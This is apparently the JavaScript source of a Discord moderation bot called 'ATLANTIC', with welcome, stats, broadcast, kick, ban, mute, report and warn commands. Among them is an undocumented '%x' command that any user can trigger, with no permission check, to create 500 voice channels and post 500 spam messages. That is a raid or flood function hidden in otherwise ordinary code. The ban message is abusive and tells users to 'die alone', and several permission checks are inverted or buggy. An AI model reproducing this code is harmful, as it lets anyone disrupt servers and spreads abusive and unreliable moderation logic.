const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '%'


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`ATLANTIC BOT | %help`,"http://twitch.tv/S-F")
  console.log('')
  console.log('') 
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});


client.on('guildMemberAdd', member => {
    let channel = member.guild.channels.find('name', 'welcome-my-dear');
    let memberavatar = member.user.avatarURL
      if (!channel) return;
    let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(memberavatar)
        .addField(':running_shirt_with_sash: | name :  ',`${member}`)
        .addField(':loudspeaker: | Norther server oh my heart' , `Welcome to the server, ${member}`)
        .addField(':id: | user :', "**[" + `${member.id}` + "]**" )
                .addField('| You are the member number',`${member.guild.memberCount}`)
               
                  .addField("Name:",`<@` + `${member.id}` + `>`, true)
                     
                                     .addField(' server', `${member.guild.name}`,true)
                                       
     .setFooter("**THE ATLANTIC**")
        .setTimestamp()
   
      channel.sendEmbed(embed);
    });

	





client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc1') {
    if (!args[1]) {
return;
}
        message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .addField(' » message : ', args)
            .setColor('#ff0000')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});


client.on('message', message => {
    if (message.author.bot) return;
    if(message.content == '%member') {
    const embed = new Discord.RichEmbed()
    .addField(` **ATLANTIC** Members`,'-',   true)
.addField(`  online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}`,'-',   true)
.addField(`  dnd:     ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}`,'-',   true)
.addField(`  idle:      ${message.guild.members.filter(m=>m.presence.status == 'idle').size}`,'-',   true)   
.addField(`  offline:   ${message.guild.members.filter(m=>m.presence.status == 'offline').size}`,'-',  true) 
.addField(`  all:  ${message.guild.memberCount}`,'-',   true)         
         message.channel.send({embed});

    }
  });


client.on('message', function(msg) {
         var prefix = "%"
    if(msg.content.startsWith (prefix  + 'server')) {
      let embed = new Discord.RichEmbed()
      .setColor('RANDOM') 
      .setThumbnail(msg.guild.iconURL)
      .setTitle(`Showing Details Of  **${msg.guild.name}*`)
      .addField(':globe_with_meridians:** Server region**',`[** __${msg.guild.region}__ **]`,true)
      .addField(':page_facing_up: ** __Roles__**',`[** __${msg.guild.roles.size}__ **]`,true)
      .addField(':red_circle: **__ Members__**',`[** __${msg.guild.memberCount}__ **]`,true)
      .addField(':large_blue_circle: **__ Online members__**',`[** __${msg.guild.members.filter(m=>m.presence.status == 'online').size}__ **]`,true)
      .addField(':pencil:**__ Text channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'text').size}__** ]`,true)
      .addField(':microphone2:**__ Voice channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'voice').size}__ **]`,true)
      .addField(':crown:**__ Server owner__**',`**${msg.guild.owner}**`,true)
      msg.channel.send({embed:embed});
    }
  });

	  
	  
	const devs = ['348555232529219585'];
const adminprefix = "%";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!devs.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  }
  });  
	  
	  

	  
client.on('message', message => {
    if (message.author.id === client.user.id) return;
            if (message.content.startsWith(prefix + "ping")) {
        message.channel.sendMessage(':ping_pong: Pong! In `' + `${client.ping}` + ' ms`');
    }
});	    

	  
	  
client.on('message',function(message) {
    let toKick = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + 'kick')) {
       if(!message.member.hasPermission("KICK_MEMBERS")) return message.reply('**# - You dont have enough permissions!**');
       if(toKick.bannable) return message.reply("**# - I cannot kick someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toKick.id === message.author.id) return message.reply("**# You cannot kick yourself!**")
       if(!message.guild.member(toKick).bannable) return message.reply("**# - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("You have been kicked from a server!")
       .setThumbnail(toKick.avatarURL)
       .addField("**# - Server:**",message.guild.name,true)
       .addField("**# - Reason:**",toReason,true)
       .addField("**# - Kicked By:**",message.author,true)
       if(message.member.hasPermission("KICK_MEMBERS")) return (
           toKick.sendMessage({embed: toEmbed}).then(() => message.guild.member(toKick).kick()).then(() => message.channel.send(`**Yes Ma Boy I Have Been _kicked_  ${toKick}**`))
       )
       }
});

	  
	 
	 
client.on("message", function(message) {
    let toBan = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + "ban")) {
       if(!message.member.hasPermission("BAN_MEMBERS")) return message.reply("**# - You dont have enough permissions!**");
       if(!toBan) return message.reply("**# - Mention a user!**");
       if(toBan.id === ("441924652437209090")) return message.reply("** You cannot ban me!**");
       if(toBan === message.member.guild.owner) return message.reply("** You cannot ban the owner of the server!**");
       if(toBan.bannable) return message.reply("**# - I cannot ban someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toBan.id === message.author.id) return message.reply("** You cannot ban yourself!**")
       if(!message.guild.member(toBan).bannable) return message.reply("** - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("Hello MotherFucker :wave: You Have Been Banned From ``ATLANTIC`` Go Away And Die Alone !")
       .setThumbnail(toBan.avatarURL)
       .addField("** - Server:**",message.guild.name,true)
       .addField("** - Reason:**",toReason,true)
       .addField("** - Banned By:**",message.author,true)
       if(message.member.hasPermission("BAN_MEMBERS")) return (
           toBan.sendMessage({embed: toEmbed}).then(() => message.guild.member(toBan).ban({reason: toReason})).then(() => message.channel.send(`**Yes Ma Boy I Have Been banned  ${toBan}**`))
       );
       
   }
}); 
	  


client.on("message", message => {
  if (message.author.bot) return;
  
  let command = message.content.split(" ")[0];
  
  if (command === "%mute") {
        if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
  let user = message.mentions.users.first();
  let modlog = client.channels.find('name', 'mute-log','time');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply("** Does No Role 'Muted' **").catch(console.error);
  if (message.mentions.users.size < 1) return message.reply('** You Need To Mention Member First**').catch(console.error);
  
  const embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setTimestamp()
    .addField('Use:', 'Talk/Shut Up')
    .addField('Muted:', `${user.username}#${user.discriminator} (${user.id})`)
    .addField('By:', `${message.author.username}#${message.author.discriminator}`)
   
   if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply('** You Dont have  Permission Manage Roles **').catch(console.error);
 
  if (message.guild.member(user).roles.has(muteRole.id)) {
return message.reply("**:white_check_mark: .. Member Was Muted**").catch(console.error);
} else {
    message.guild.member(user).addRole(muteRole).then(() => {
return message.reply("**:white_check_mark: .. Member Was Muted**").catch(console.error);
});
  }

};

});
client.on("message", message => {
  if (message.author.bot) return;
  
  let command = message.content.split(" ")[0];
  
  if (command === "%unmute") {
        if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
  let user = message.mentions.users.first();
  let modlog = client.channels.find('name', 'mute-log');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply("** Does No Role 'Muted' **").catch(console.error);
  if (message.mentions.users.size < 1) return message.reply('** You Need To Mention Member First**').catch(console.error);
  const embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setTimestamp()
    .addField('Use:', 'Talk/Shut Up')
    .addField('UnMuted:', `${user.username}#${user.discriminator} (${user.id})`)
    .addField('By:', `${message.author.username}#${message.author.discriminator}`)

  if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply('** You Dont have  Permission Manage Roles **').catch(console.error);

  if (message.guild.member(user).removeRole(muteRole.id)) {
return message.reply("**:white_check_mark: .. Member Was UnMuted **").catch(console.error);
} else {
    message.guild.member(user).removeRole(muteRole).then(() => {
return message.reply(":white_check_mark:  has been unmuted!  **").catch(console.error);
});
  }

};

});
















client.on("message", message => {
  if (message.content === "%help") {
  message.channel.send('``Check Your DMs bud  ``')
   const embed = new Discord.RichEmbed()
       .setColor('Black')
       .setFooter('By [Eriep] And [Vervolek]')
       .setThumbnail(message.author.avatarURL)
       .setDescription(`
 +[ ---------------------------- ]+
   **Administrationr Commands**
 +[ ---------------------------- ]+
 %ban    <member> <reason>   | For Ban A Member
 %kick   <member> <reason>   | For Kick A Member
 %mute   <member> <reason>   | For Mute A Member
 %unmute <member>            | For Unmute A Member
 %bc1                        | For Do BroadCast
 +[ ---------------------------- ]+
         **General  Commands**
 +[ ---------------------------- ]+
 %help                       | For Sent This Message
 %report <member> <reason>   | For Report A Member
 %server                     | For See Server Stats
 %members                    | For See Members Stats

 `)
 message.author.send(embed);
}  
});







client.on('message', message => {

  if (message.content.startsWith( prefix + "report")) {
  if (!message.channel.guild) return;
  let args = message.content.split(" ").slice(1).join(' ');
  client.channels.get("406189462419144745").send(
      "\n" + "**" + " Member : " + "**" +
      "\n" + "**" + ":arrow_right:  " + message.author.tag + "**" +
      "\n" + "**" + " Reported : " + "**" +
      "\n" + "**" + args + "**")

  }
  });



  
  
  

client.on('message', message => {

    if (message.content.startsWith("back")) {        
    const embed = new Discord.RichEmbed()
        .setColor("#081070")
        .setDescription(" Welcome Back :tada:")
      message.channel.sendEmbed(embed).then(message => {message.delete(60000)});
}
});




  

  
client.on('message', message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;
  if(!message.channel.guild) return;
  if(!message.member.hasPermission('MANAGE_MESSAGES')) return;
  if (message.mentions.users.size < 1) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);
if (command == "warn") {
    let say = new Discord.RichEmbed()
    .setDescription(args.join("  "))
    .setColor(0x831f18)
    message.channel.sendEmbed(say);
    client.channels.get("462865002819223552").send(`**=========================================**`)
    client.channels.get("462865002819223552").send(`**New Warn !**`)
    client.channels.get("462865002819223552").send({embed : say})
    client.channels.get("462865002819223552").send(`**Admin : ${message.author.username}#${message.author.discriminator}**`)
    client.channels.get("462865002819223552").send(`**In Channel : ${message.channel}**`)
    client.channels.get("462865002819223552").send(`**==========================================**`	)
    message.delete();
  }


});





 
 

 client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'x')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('ATLANTIC GANG', 'voice')
        message.channel.send('lol');
}
}
}); 



client.on('message', message => {
    if (message.content.includes('https://discord.gg')){
    if(!message.channel.guild) return message.reply ('')
    if (!message.member.hasPermissions(['MANAGE_MESSAGES'])){
    message.channel.send('kick <@' + message.author.id + '>')
    message.delete() 
    }
    }
    if (message.content.startsWith("kick ")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply();
    var member= message.mentions.members.first();
    member.kick().then((member) => {
    message.channel.sendMessage("", {embed: {
    author: {
    },
    title: 'Reason Adversting ' + member.displayName + ' Kicked',
    color: 490101,
    }
    });
    }
    ) 
    }
    });


client.login(process.env.BOT_TOKEN);
